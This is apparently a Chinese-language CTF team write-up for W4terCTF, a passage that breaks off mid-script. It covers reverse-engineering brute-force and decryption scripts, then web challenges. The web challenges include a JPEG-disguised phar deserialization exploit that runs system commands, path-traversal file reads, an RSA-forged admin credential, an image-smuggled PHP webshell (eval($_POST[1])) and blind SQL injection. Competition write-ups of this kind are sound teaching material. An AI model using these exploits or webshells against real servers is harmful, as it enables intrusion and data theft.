jsonify(&#123;&#x27;reset_chances&#x27;: reset_chances&#125;)@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;])def index(): return send_from_directory(app.static_folder, &#x27;index.html&#x27;)if __name__ == &#x27;__main__&#x27;: app.run(debug=True, host=&#x27;0.0.0.0&#x27;, port=80) 分析源码，可以一眼看出diff要足够的小才能最大限度地提高概率 然后生成伪随机数的方法是MT19937梅森旋转法，其中的随机数值是根据seed而定的 所以为了让diff更小，我遍历seed去选产生的第index个伪随机数最小的seed 寻找的脚本 123456789101112131415161718192021import randomfrom tqdm import tqdmimport stringfor i in tqdm(range(24*60*60)): random.seed(i) &#x27;&#x27;&#x27; characters = string.ascii_letters + string.digits a=&#x27;&#x27;.join(random.choice(characters) for _ in range(4)) if &quot;lag&quot; in a: print(a) print(i) &#x27;&#x27;&#x27; for j in range(10): diff=10000 for _ in range(j): diff = min(abs(random.randint(0, 1919810) - 114514), 10000) if diff&lt;2: print(diff) print(j) print(i) 然后是队友的发包程序 123456789101112import requestsurl = &quot;http://localhost:44196/wish&quot;data = &#123;&#x27;time&#x27;:20544,&#x27;index&#x27;:1&#125;res = requests.post(url=url, json=data)#print(res.content, res.status_code)print(res.text, res.status_code) 然后就有每次十分之一的概率寻找flag了 Reverse（7题）BruteforceMebase64加cr4但是他加了一个能够判别多少位重合的机制，那么直接脚本爆破我是先报了一部分再进行调试再爆破 123456789101112131415161718192021222324252627282930313233343536373839404142#尝试某一位的爆破from pwn import *import string# 已知的开头和结尾known_prefix = &quot;W4terCTF&#123;Unr3I4&quot;known_suffix = &quot;7Ed_6yt4u_c4N_6e_ENuMerated&#125;&quot; # 填充剩余的字符以满足长度要求# 所有可能的字符all_chars = string.ascii_letters + string.digits + &quot;_!?.&#x27;,&quot;# 初始化尝试的flagflag = known_prefix + known_suffixi=24sum=58max_matched = summax_c = &#x27;&#x27;for c in all_chars: # 尝试下一个字符 # 创建一个进程 p = process(&#x27;BruteforceMe.exe&#x27;) attempt = flag[:i] + c + flag[i+1:] # 发送尝试的flag p.sendline(attempt) # 获取返回的信息 result = p.recvuntil(&quot;matched. Try again!&quot;).decode() # 解析返回的匹配信息 matched = int(result.split(&#x27; &#x27;)[3]) # 如果匹配的数量增加了，那么我们就记录下这个字符 if matched &gt;= max_matched: max_matched = matched max_c = c print(c) print(&quot;Progress: &#123;:.2%&#125;&quot;.format(max_matched / 60.0)) p.close() # 在每一轮结束后，我们选择使得匹配数量增加最多的字符if max_c: sum = max_matched flag = flag[:i] + max_c + flag[i+1:] # 打印出当前的进度百分比 print(&quot;Progress: &#123;:.2%&#125;&quot;.format(max_matched / 60.0))print(&quot;Progress: &#123;:.2%&#125;&quot;.format(max_matched / 60.0))print(&quot;The flag is:&quot;, flag) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#尝试所有位数的爆破from pwn import *import string# 已知的开头和结尾known_prefix = &quot;W4terCTF&#123;&quot;known_suffix =&quot;Unr3I47Ed_6yt4u_c4N_6e_ENuMerated&#125;&quot; # 填充剩余的字符以满足长度要求# 所有可能的字符all_chars = string.ascii_letters + string.digits + &quot;_&quot;# 初始化尝试的flagflag = known_prefix + known_suffixsum=58attempts_when_sum_59 = []for i in range(len(known_prefix), 43): max_matched = sum max_c = &#x27;&#x27; for c in all_chars: # 尝试下一个字符 # 创建一个进程 p = process(&#x27;BruteforceMe.exe&#x27;) attempt = flag[:i] + c + flag[i+1:] # 发送尝试的flag p.sendline(attempt) # 获取返回的信息 result = p.recvuntil(&quot;matched. Try again!&quot;).decode() # 解析返回的匹配信息 print(result) matched = int(result.split(&#x27; &#x27;)[3]) # 如果匹配的数量增加了，那么我们就记录下这个字符 if matched &gt; max_matched: max_matched = matched max_c = c print(attempt) if matched == 59: attempts_when_sum_59.append(attempt) p.close() # 在每一轮结束后，我们选择使得匹配数量增加最多的字符 if max_c: sum = max_matched flag = flag[:i] + max_c + flag[i+1:] # 打印出当前的进度百分比 print(&quot;Progress: &#123;:.2%&#125;&quot;.format(max_matched / 60.0))print(&quot;Progress: &#123;:.2%&#125;&quot;.format(max_matched / 60.0))print(&quot;The flag is:&quot;, flag)for attempt in attempts_when_sum_59: print(attempt) 1#W4terCTF&#123;UNr3I47Ed_6ytE5_c4N_6e_ENuMerated&#125; 一开始本来想着三位三位爆破的，但是不知道哪里出了问题可能是debug操作失误，然后就让我以为后面的位数会影响前面的，导致了脚本不断修改尝试最后才出 boxbox的加密实际上就两个函数，只是一个藏起来了不太好找。找到对照数组发现他在前面的函数中被引用过，直接就可以发现还有一层加密 1234567891011# 假设byte_41B000是一个字节数组byte_41B000 = [0x5A, 0x66, 0x6E, 0x59, 0x44, 0x69, 0x74, 0x6B, 0x49, 0x09, 0x0D, 0x09, 0x53, 0x47, 0x62, 0x6F, 0x14, 0x50, 0x40, 0x6E, 0x11, 0x63, 0x7A, 0x69, 0x4E, 0x59, 0x1C, 0x69, 0x68, 0x6B, 0x6F, 0x63, 0x4B, 0x4D, 0x29, 0x45, 0x43, 0x49, 0x5D, 0x7B, 0x74, 0x51, 0x46, 0x71, 0x6C, 0x41, 0x7B, 0x69, 0x6D]# 计算byte_41B520的值byte_41B520 = [i ^ b ^ 0x33 for b, i in zip(range(0,49), byte_41B000)]# 将byte_41B520转换为字符串str_41B520 = &#x27;&#x27;.join(chr(b) for b in byte_41B520)print(str_41B520)#iT_is_A_r341ly_S7raN6E_Mes5AGEBOX_8UT_HooK_is_fun nor嵌套函数太多了，一开始都看蒙了，然后一个一个分析从最小的开始其实就是异或门、与门和或门，构成的第一个函数的作用就是最关键的是这个函数，他的功能实际上就是加法器 接下来两个函数的功能就显而易见了 123456enc=[15, 9, 16, 14, 16, 12, 63, 29, 23, 49, 23, 12, 63, 8, 55, 49, 39, 57, 35, 20, 13, 24, 43, 57, 17, 234, 229, 239, 52, 0, 5, 24, 9, 23, 227, 53, 14, 236, 227, 243, 62, 29]dec=&#x27;&#x27;for i in range(42): dec+=chr((enc[i]^102)-i)print(dec)#intereStiNg_MaCH1N3_Wi7H_sin6IE_OPc0De_n0R 古老的语言检测文件发现要用vb打开，然后没有提示一直不知道这个反编译竟然有问题，关掉优化后就可以看到完整代码。可以说vb的语言是真的有点恶心，参数又多又杂。翻译成正常的就是第一层将每个字符转成对应数值的16进制数，每四个依次构成一个八位十六进制数，共十二个。 接下来就是恶心的feistel网络加密，第一次接触不知道这个怎么逆运算，还有就是雷哥sublong函数的干扰导致一直有一堆错误。实际上就是加密过程和解密基本一样，key不用变，就是temp需要从尾巴开始然后一组三个部分得从后往前算。temp的值我一直算不对，查了才发现是sublong（）的问题。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394#include &lt;stdio.h&gt;long AddLong(long lX, long lY) &#123; long var_98 = (lX &amp; -2147483648); long var_9C = (lY &amp; -2147483648); long var_90 = (lX &amp; 0x40000000); long var_94 = (lY &amp; 0x40000000); long var_A0 = ((lX &amp; 0x3FFFFFFF) + (lY &amp; 0x3FFFFFFF)); if (var_90 &amp; var_94) &#123; var_A0 = var_A0 ^ -2147483648 ^ var_98 ^ var_9C; &#125; else if (var_90 | var_94) &#123; if (var_A0 &amp; 0x40000000) &#123; var_A0 = var_A0 ^ -1073741824 ^ var_98 ^ var_9C; &#125; else &#123; var_A0 = var_A0 ^ 0x40000000 ^ var_98 ^ var_9C; &#125; &#125; else &#123; var_A0 = var_A0 ^ var_98 ^ var_9C; &#125; return var_A0;&#125;long LeftRotateLong(long lValue, int lBits) &#123; lBits = lBits % 32; long var_98 = lValue; if (lBits == 0) &#123; return var_98; &#125; for (int i = 1; i &lt;= lBits; i++) &#123; long var_90 = (var_98 &amp; 0x40000000); var_98 = ((var_98 &amp; 0x3FFFFFFF) * 2); if (var_90 &amp; 0x40000000) &#123; var_98 = (var_98 | 0x80000000); &#125; &#125; return var_98;&#125;long RightRotateLong(long lValue, int lBits) &#123; lBits = lBits % 32; long var_98 = lValue; if (lBits == 0) &#123; return var_98; &#125; for (int i = 1; i &lt;= lBits; i++) &#123; long var_90 = (var_98 &amp; 0x80000000); var_98 = (long)((double)(var_98 &amp; 0x7FFFFFFE) / 2.0); if (var_90) &#123; var_98 = (var_98 | 0x40000000); &#125; &#125; return var_98;&#125;void decrypt( long* first) &#123; long sum0 = 0; long delta = -1640531527; long key1 = -559038737; long key2 = -1161901314; for (int i = 0; i &lt; 32; i++) &#123; sum0 = AddLong(sum0, delta); &#125; for (int i = 0; i &lt; 12; i += 3) &#123; long sum = sum0; for (int j = 32; j &gt; 0; j--) &#123; first[i+2] = first[i+2] ^ AddLong(AddLong((LeftRotateLong(first[i], 4) ^ key1), first[i] ^ sum), RightRotateLong(first[i], 5) ^ key2); first[i+1] = first[i+1] ^ AddLong(AddLong((LeftRotateLong(first[i+2], 4) ^ key1), first[i+2] ^ sum), RightRotateLong(first[i+2], 5) ^ key2); first[i] = first[i] ^ AddLong(AddLong((LeftRotateLong(first[i+1], 4) ^ key1), first[i+1] ^ sum), RightRotateLong(first[i+1], 5) ^ key2); sum -=delta; &#125; if(sum==0) printf(&quot;success\\n&quot;); else printf(&quot;sum=%ld\\n&quot;,sum); &#125;&#125;void hexToAscii(long hex) &#123; for (int i = 3; i &gt;= 0; i--) &#123; char ascii = (hex &gt;&gt; (i * 8)) &amp; 0xFF; printf(&quot;%c&quot;, ascii); &#125;&#125;int main() &#123; long second[] = &#123;0x43B8FCAA,-665053883,0x56D39844, -642155210,-1738731608,-1749042081, 0x25111FBC,0x21EF722F,0x1BB24871, -2024195415,-483300007,-2138971017&#125;; decrypt(second); for (int i = 0; i &lt; 12; i++) &#123; hexToAscii(second[i]); &#125; return 0;&#125;#W4terCTF&#123;TIme_to_USe_moD3RN_LaNGU4gE5_IIKE_ru57&#125; Crabs第一部分简单异或： 123456a=&#x27;l2v\\Q0YCzh&#125;TMR~csegaQJA&amp;LQEV]iL.x~cm@&#x27;b=&#x27;&#x27;for i in range(37): b+=chr(i^ord(a[i]))print(b)#l3t_U5_Draw_A_plcturE_W1TH_MAtR1X_ANd 第二部分分析出来是矩阵乘法，那就逆运算 矩阵求逆可以使用sagemath中的函数 即在整数域上进行求逆 1234567891011121314151617181920212223242526from sage.all import *a=Matrix(ZZ,[[4,35,25,23,13,25,40,23,42,27,28,39,25,31,43,6,45],[44,39,34,37,22,9,39,47,27,21,46,4,48,48,44,39,2],[8,29,12,36,16,4,34,34,42,27,27,43,40,21,39,32,0],[46,10,3,20,2,46,48,13,25,6,24,16,26,26,25,11,13],[5,32,22,46,6,39,37,21,43,26,40,20,26,0,9,44,23],[8,10,20,8,19,48,6,22,9,12,24,36,5,7,39,5,32],[27,14,19,48,34,32,3,42,34,46,27,42,30,33,36,28,37],[12,41,6,25,27,1,6,1,6,13,33,3,43,0,5,20,18],[41,21,41,16,48,41,34,8,8,49,46,15,44,18,10,7,46],[9,21,48,15,30,18,20,42,7,39,35,31,15,43,39,18,2],[45,5,38,1,35,46,47,37,17,40,3,8,0,46,41,2,44],[40,7,3,48,1,27,22,5,46,20,34,48,19,46,31,9,22],[30,26,3,16,5,12,34,20,33,10,27,26,17,46,45,32,28],[12,19,31,10,34,4,22,33,18,33,3,37,4,42,49,10,41],[23,49,27,16,15,12,20,43,38,25,38,40,5,24,15,2,43],[19,16,12,21,30,36,10,3,10,43,9,6,21,32,22,23,6],[8,32,48,31,21,41,13,16,20,4,0,8,49,16,9,11,44]])b=Matrix(ZZ,[[14487,14845,14720,15333,13190,16866,15824,14888,15827,16356,15636,15374,14942,18116,18038,10367,16975],[13892,15355,15536,15027,13904,16628,15569,15024,15011,16832,16384,15204,15622,17589,17647,10605,16669],[13569,14692,13547,15027,13156,14945,15025,14752,15147,15846,15738,15340,14942,17385,18327,11098,16380],[14436,14675,14482,15945,13462,16611,15467,14837,15691,16203,15857,15357,15741,17725,18106,10758,17077],[14351,14301,13904,14806,12833,16169,15603,14616,15487,16288,15636,15238,14109,17844,17885,10180,16227]])x=a.solve_left(b)print(x) 根据得到的结果对照可得： Shuffle Puts签到题，打开ida，查看反编译代码即可找到flag DouDou很可惜比赛结束几分钟才做出来否则就第三了 先是js解混淆，用网站https://deobfuscate.relative.im 然后观察可以发现主要是用到e函数进行加密是个aes加密 12345678910111213141587, 52, 116, 101, 114, 68, 114, 48, 112, 67, 84, 70, 50, 48, 50, 52, 82#这个是key r = &#x27;4b000aec37eca4a5adb8a52427dcb15d&#x27;, A = &#x27;a6c7b217309e01aaea328e8479b778bd&#x27;, s = &#x27;9f71e0e08533b2cc8202224390d80e2d&#x27;, y = &#x27;9e7383abc24a6165d60c6a69eccf07fd&#x27;, B = &#x27;b1ecc9f97265c94458bbd4a921cf8bc3&#x27;, F = &#x27;dd6e52061e848546cfd52b695da8505e&#x27;, w = &#x27;16802967647e60ad8a61a2a46d97ce3e&#x27;, Q = &#x27;2a3c98a735e280b9f232c27cdbf710d5&#x27;, b = &#x27;ce0722b99e13a6240b84d8a54ecfb11a&#x27;, p = &#x27;65afef999dcada31a39a7c70b570a1c3&#x27;, i = &#x27;8702aa3410ff1bf13d36310da6ea8df3&#x27;, f = &#x27;d2dceedae2b841966e6611ab0f2a73d2&#x27; #这个是密文 python解aes的ecb模式，然后最后还有个异或的小加密 12345678910111213141516171819202122from Crypto.Cipher import AESfrom binascii import a2b_hexdef decrypt(text): key = &quot;W4terDr0pCTF2024&quot;.encode(&quot;utf-8&quot;) mode = AES.MODE_ECB # 将16进制字符串转回字节串 text = a2b_hex(text) d = b&quot;&quot; # 反向异或操作 for i in range(len(text)): d += (text[i] ^ 0x99).to_bytes( length=1, byteorder=&quot;little&quot;, signed=False ) cryptos = AES.new(key, mode) # 解密 plain_text = cryptos.decrypt(d) return plain_texts=&#x27;122211031133122111031133102112320313030313020303130303131021103203121133100112321210113303211311031013101011110210321201130211211133122111031133031010301103030011331212111110321032132102010201&#x27;for i in range (0,len(s),4): print(chr(int(s[i:i+4],4)),end=&#x27;&#x27;)#jS_iS_In73r3s7IN6_And_9u4tERNarY_iS_4LS0_fUNNy!! Web（5题）Auto Unserialize 题目 123456789101112131415161718192021222324252627282930313233343536373839404142&lt;?phphighlight_file(__FILE__);class command_test&#123; public $command = &quot;echo &#x27;test&#x27;&quot;; public function __destruct()&#123; eval($this-&gt;command); &#125;&#125;if (!empty($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;])) &#123; $tmpName = $_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;]; if (is_uploaded_file($tmpName)) &#123; if (move_uploaded_file($tmpName, &quot;/var/www/html/check.jpg&quot;)) &#123; echo &quot;Upload successful.&quot;; &#125; else &#123; die(&quot;Error in file upload.&quot;); &#125; &#125; if (is_file(&#x27;check.jpg&#x27;)) &#123; if (getimagesize(&#x27;check.jpg&#x27;) === false) &#123; unlink(&#x27;check.jpg&#x27;); die(&quot;I like images but not this&quot;); &#125; &#125;&#125;if (isset($_GET[&#x27;img_file&#x27;])) &#123; if (file_exists($_GET[&#x27;img_file&#x27;])) &#123; echo &quot;Success&quot;; &#125; else &#123; echo &quot;Failed&quot;; &#125;&#125;?&gt;file_exists(&quot;phar://./phar.phar&quot;)file_exists(&quot;phar://./1.phar&quot;)/?img_file=phar://var/www/html/check.jpg/?img_file=check.jpg 找不到上传入口 尝试phar 脚本 12345678910111213141516171819202122232425262728293031323334353637383940414243444546&lt;?phpclass command_test&#123; public $command = &quot;system(&#x27;cd ..;cd ..;cd ..;ls;cat flag;&#x27;);&quot;;&#125;$jpeg_header_size = &quot;\\xff\\xd8\\xff\\xe0\\x00\\x10\\x4a\\x46\\x49\\x46\\x00\\x01\\x01\\x01\\x00\\x48\\x00\\x48\\x00\\x00\\xff\\xfe\\x00\\x13&quot; . &quot;\\x43\\x72\\x65\\x61\\x74\\x65\\x64\\x20\\x77\\x69\\x74\\x68\\x20\\x47\\x49\\x4d\\x50\\xff\\xdb\\x00\\x43\\x00\\x03\\x02&quot; . &quot;\\x02\\x03\\x02\\x02\\x03\\x03\\x03\\x03\\x04\\x03\\x03\\x04\\x05\\x08\\x05\\x05\\x04\\x04\\x05\\x0a\\x07\\x07\\x06\\x08\\x0c\\x0a\\x0c\\x0c\\x0b\\x0a\\x0b\\x0b\\x0d\\x0e\\x12\\x10\\x0d\\x0e\\x11\\x0e\\x0b\\x0b\\x10\\x16\\x10\\x11\\x13\\x14\\x15\\x15&quot; . &quot;\\x15\\x0c\\x0f\\x17\\x18\\x16\\x14\\x18\\x12\\x14\\x15\\x14\\xff\\xdb\\x00\\x43\\x01\\x03\\x04\\x04\\x05\\x04\\x05\\x09\\x05\\x05\\x09\\x14\\x0d\\x0b\\x0d\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14&quot; . &quot;\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\xff\\xc2\\x00\\x11\\x08\\x00\\x0a\\x00\\x0a\\x03\\x01\\x11\\x00\\x02\\x11\\x01\\x03\\x11\\x01&quot; . &quot;\\xff\\xc4\\x00\\x15\\x00\\x01\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\xff\\xc4\\x00\\x14\\x01\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xff\\xda\\x00\\x0c\\x03&quot; . &quot;\\x01\\x00\\x02\\x10\\x03\\x10\\x00\\x00\\x01\\x95\\x00\\x07\\xff\\xc4\\x00\\x14\\x10\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\xff\\xda\\x00\\x08\\x01\\x01\\x00\\x01\\x05\\x02\\x1f\\xff\\xc4\\x00\\x14\\x11&quot; . &quot;\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\xff\\xda\\x00\\x08\\x01\\x03\\x01\\x01\\x3f\\x01\\x1f\\xff\\xc4\\x00\\x14\\x11\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20&quot; . &quot;\\xff\\xda\\x00\\x08\\x01\\x02\\x01\\x01\\x3f\\x01\\x1f\\xff\\xc4\\x00\\x14\\x10\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\xff\\xda\\x00\\x08\\x01\\x01\\x00\\x06\\x3f\\x02\\x1f\\xff\\xc4\\x00\\x14\\x10\\x01&quot; . &quot;\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\xff\\xda\\x00\\x08\\x01\\x01\\x00\\x01\\x3f\\x21\\x1f\\xff\\xda\\x00\\x0c\\x03\\x01\\x00\\x02\\x00\\x03\\x00\\x00\\x00\\x10\\x92\\x4f\\xff\\xc4\\x00\\x14\\x11\\x01\\x00&quot; . &quot;\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\xff\\xda\\x00\\x08\\x01\\x03\\x01\\x01\\x3f\\x10\\x1f\\xff\\xc4\\x00\\x14\\x11\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\xff\\xda&quot; . &quot;\\x00\\x08\\x01\\x02\\x01\\x01\\x3f\\x10\\x1f\\xff\\xc4\\x00\\x14\\x10\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\xff\\xda\\x00\\x08\\x01\\x01\\x00\\x01\\x3f\\x10\\x1f\\xff\\xd9&quot;;$phar = new Phar(&quot;2.phar&quot;);$phar-&gt;startBuffering();$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;);$phar-&gt;setStub($jpeg_header_size . &quot; __HALT_COMPILER(); ?&gt;&quot;);$o = new command_test();$phar-&gt;setMetadata($o);$phar-&gt;stopBuffering(); 伪装成图片的php脚本,[翻译]如何将 PHP Phar 包转化成图像以绕过文件类型检测-CSDN博客 GitZip12345https://gitzip.org/https://github.com/GitZip/gitzip.org这样的网站也会有漏洞，想不到吧！FLAG in /tmp/flag 以上信息为误导信息 代码审计 在routes.js下发现 1234567891011121314151617// ===================================== // Web pages =========================== // ===================================== app.get(&#x27;/&#x27;, function(req, res)&#123; res.sendFile(path.resolve(__dirname, &#x27;../&#x27;, &#x27;views/index.html&#x27;)); &#125;); app.get(&#x27;/:htmlname&#x27;, function(req, res)&#123; var name = req.params.htmlname; var requestPath = path.resolve(__dirname, &#x27;../&#x27;, &#x27;views/&#x27; + name); if (fs.existsSync(requestPath)) &#123; // Do something res.sendFile(requestPath); &#125;else&#123; res.status(404).send(&#x27;Not found&#x27;); &#125; &#125;); requestPath = path.resolve(__dirname, ‘../‘, ‘views/‘ + name);可以实现任意文件读取 构造payload发送 /../../../../tmp/flag 即可 注意这里 / 需要url编码发送 ASHBP1234567891011121314151617181920212223// admin.php&lt;?phpinclude(&quot;rsa.php&quot;);include(&quot;download.php&quot;);if($_POST[&#x27;cre&#x27;])&#123; if(rsa_decrypt($_POST[&#x27;cre&#x27;])!=&#x27;admin&#x27;)&#123; echo &quot;凭据无效！&quot;; &#125; //cre == admin else&#123; echo get_flag(); &#125;&#125;?&gt;// download.php&lt;?php function get_flag()&#123;//flag == ../../../../../flag.php return file_get_contents(rsa_decrypt($_POST[&#x27;flag&#x27;]));&#125;?&gt; 114775389255996250411216234491594398597225320426770762975422890469577828503535104091379415228489273198358046401943260876011710151302917584011251292020040281850364872539746024731573514408002450980166506176411170339067674764112346684536466446872682133703656532806131002005225331131138722629857593002147478979920 179666064669479503565757120118709286898444254899330310219058760922164429110197921573000847542660084392313142620174005901857458000882449229909519256589590863981625176399350264565473435443654608599321087768154746622544760578697587251951582132434004866717504828270979795734234752815558491495085331626005167632606 123456789101112from Crypto.Util.number import * import base64m=b&#x27;admin&#x27;n = 116221867963354687757704081786892198117735405263389670479659585890012941016941472275609245862830614984647254340783748576991164688879246169843491703915372412360180824266586464924230649664903351315516847937141034095957845784486824474311707195475342290555230834843642331737823450945641094715991151831167822352641e = 65537c=pow(bytes_to_long(m), e, n)strc=long_to_bytes(c)#print(strc)d=base64.b64encode(strc).decode()print(&quot;d: &quot;)print(d) 12345678910111213141516171819202122232425&lt;?phpdefine(&quot;PUBLIC_PATH&quot;, &quot;./src/rsa_pub.pem&quot;);function rsa_encrypt($data)&#123; $public_key = openssl_pkey_get_public(file_get_contents(PUBLIC_PATH)); printf(&quot;待加密数据: %s&quot;, $data); printf(&quot;&lt;br&gt;&quot;); openssl_public_encrypt($data, $crypted, $public_key); printf(&quot;加密后数据: %s&quot;, $crypted); printf(&quot;&lt;br&gt;&quot;); $eb64_cry = base64_encode($crypted); printf(&quot;发送的数据: %s&quot;, $eb64_cry); printf(&quot;&lt;br&gt;&quot;); return $eb64_cry; $encoded_string = urlencode($eb64_cry); printf(&quot;发送: %s&quot;, $encoded_string);&#125;# / 1 / 2 / 3 / 4# /var/www/html/index.php#rsa_encrypt(&quot;admin&quot;);rsa_encrypt(&quot;/var/../../../../../../../tmp/flag&quot;); 12admin == IotOsOjglrGDbFkcILzBT/SCqkIAjJB14fv8L555NDT3ydDRVRCDIi7tDpUCBusfg2O3nmJTwt3EuPFcZoYVT05/fzKHieVDg/NPsL4Z6OjPA55fuzFsoxzxnAn3Lt3m6jwmNvRUiXiyqZ6Vc1iIAqsd2EtXN7qf7YOBM67kl44=flag == eiEle7g73j4Qd0uOw3TKSwYLmlG1Wz/yhfMy48fBwxp+148n/DW3W3ZkJ6jnVj0lvTvsfYlo4VBTWw3hCqI8wkRVW8RmF63aRmjxajKjD/dcZX2T+2vWe9ty7pQllAKOGKjsXwmKNbJKSRSVJmehLQeCd7or+7R57rY8vVxrxT4= 12cre=%49%6f%74%4f%73%4f%6a%67%6c%72%47%44%62%46%6b%63%49%4c%7a%42%54%2f%53%43%71%6b%49%41%6a%4a%42%31%34%66%76%38%4c%35%35%35%4e%44%54%33%79%64%44%52%56%52%43%44%49%69%37%74%44%70%55%43%42%75%73%66%67%32%4f%33%6e%6d%4a%54%77%74%33%45%75%50%46%63%5a%6f%59%56%54%30%35%2f%66%7a%4b%48%69%65%56%44%67%2f%4e%50%73%4c%34%5a%36%4f%6a%50%41%35%35%66%75%7a%46%73%6f%78%7a%78%6e%41%6e%33%4c%74%33%6d%36%6a%77%6d%4e%76%52%55%69%58%69%79%71%5a%36%56%63%31%69%49%41%71%73%64%32%45%74%58%4e%37%71%66%37%59%4f%42%4d%36%37%6b%6c%34%34%3d&amp;flag=%6e%6f%43%41%34%66%4d%79%39%4f%65%54%43%54%6d%6e%61%63%54%73%6e%41%61%48%63%6a%51%53%53%4b%56%67%38%4b%42%79%46%45%6c%36%73%41%43%4d%54%4e%47%62%63%64%59%2b%71%4d%46%77%48%55%4e%6b%57%75%31%44%36%44%32%46%62%2b%4e%55%5a%48%49%70%74%6b%53%62%52%65%39%42%39%38%79%78%42%6a%69%6d%42%6c%59%6f%41%51%77%50%37%53%36%74%44%6e%73%43%56%55%54%4d%54%4e%51%53%68%6e%72%6a%52%51%4e%51%4c%70%78%53%54%41%4f%41%30%54%32%30%30%5a%76%70%4b%6b%37%63%45%57%41%71%41%74%58%32%30%63%6e%7a%57%6a%6c%66%77%70%6e%6c%53%64%37%67%57%39%77%3d 背景/思路 : 通过admin.php POST发包实现 cre admin认证 + flag 任意文件包含 12345678910111213if ($_POST[&#x27;cre&#x27;]) &#123; if (rsa_decrypt($_POST[&#x27;cre&#x27;]) != &#x27;admin&#x27;) &#123; echo &quot;凭据无效！&quot;; &#125; else &#123; echo get_flag(); &#125;&#125;function get_flag()&#123;//flag == ../../../../../flag.php return file_get_contents(rsa_decrypt($_POST[&#x27;flag&#x27;]));&#125; PNG Servernginx配置错误 上传小马 + /.php 其中小马因为检查的很严格 需要合并一张正常的图片带进去 12&lt;?phpeval($_POST[1]); 成功访问到的话可进一步使用antsword快速定位flag 2min秒了 没什么可说的 User ManagerSQL 盲注 除了给定的几个排序方法外 , 使用 Secret acs也可以排序 通过发包 123456&#123;&quot;name&quot;:&quot;W4terCTF_FLAG&quot;,&quot;secret&quot;:&quot;W4terCTF&#123;Discover_7h3_hlDdEN_114G_8y_b1iND_lnj3ctiNG_1nT0_tHE_useR_M4NA9er_591_DaTaBASE&#125;&quot;,&quot;age&quot;:2024&#125; 其中 根据ascii排序 : 1-9 &lt; _ &lt;A-Z &lt; a-z &lt; } 采用二分法查找 Misc（ak）Revenge of Vigenere这道题脑洞还挺大的，首先给了一段非常长的没法下手的明文，然后我们注意到毫不相关的题目：维吉尼亚与盖伊·福克斯，一搜发现是一部电影《V字仇杀队》，那么密文很有可能是台词或者是信件旁白之类的，搜了一下果然是 发现flag那一行不在里面，那就是根据已有的明文密文解码key，找了一句来解 12345678910111213141516171819202122232425262728293031323334353637383940414243def extended_gcd(a, b): if a == 0: return b, 0, 1 else: gcd, x, y = extended_gcd(b % a, a) return gcd, y - (b // a) * x, xdef mod_inverse(a, m): gcd, x, y = extended_gcd(a, m) if gcd != 1: return -1 else: return x % mdef find_key(plaintext, ciphertext): key = &#x27;&#x27; text_index = 1 for p_char, c_char in zip(plaintext, ciphertext): if p_char.isalpha() and c_char.isalpha(): if p_char.isupper(): base = ord(&#x27;A&#x27;) else: base = ord(&#x27;a&#x27;) if mod_inverse(text_index,26)!=-1: if (text_index + 1) % 2 == 1: key_offset = (mod_inverse(text_index,26)*(ord(c_char) - ord(p_char) + 26)) % 26 else: key_offset = (mod_inverse(text_index,26)*(ord(p_char) - ord(c_char) + 26)) % 26 else: key +=&#x27; &#x27; text_index += 1 continue key += chr(int(key_offset) + 65) text_index += 1 return keyplaintext = &quot;oila! In view, a humble vaudevillian veteran, cast vicariously as both victim and villain by the vicissitudes of Fate.&quot;ciphertext = &quot;wgiz! Pt xezy, p nheknv nksiuaetloml dsnxvxx, uufb gqrmsejqatz az fqxl fmsnyb gar daqzhse hr jge bazsbeebwloq or Qiww.&quot;key = find_key(plaintext, ciphertext)print(f&#x27;The key is: &#123;key&#125;&#x27;)#The key is: S B J W P B P Z U B T I U S S B J W B T P Z U B T I U S S B W P B T P Z U B T I U S B J 得到结果三十一循环，但是key是10-20位所以是30的因数且满足10-20，可以知道是15，然后将他拼起来就可以解码维吉尼亚了 123456789101112131415161718192021222324252627282930313233343536def decrypt_vigenere_variant(ciphertext, key): key_index = 1 key_length = 15 plaintext = &#x27;&#x27; text_index = 496 for char in ciphertext: if char.isalpha(): key_char = key[key_index % key_length].upper() key_offset = ord(key_char) - 65 if char.isupper(): base = ord(&#x27;A&#x27;) else: base = ord(&#x27;a&#x27;) if (text_index + 1) % 2 == 1: decrypted_char = chr( (ord(char) - base - text_index * key_offset) % 26 + base) else: decrypted_char = chr( (ord(char) - base + text_index * key_offset) % 26 + base) plaintext += decrypted_char key_index += 1 text_index += 1 else: plaintext += char return plaintext# 用你的密钥替换 &#x27;YOUR_KEY&#x27;，用你的密文替换 &#x27;YOUR_CIPHERTEXT&#x27;key = &#x27;PSZBUJBWTPIBUTS&#x27;ciphertext = 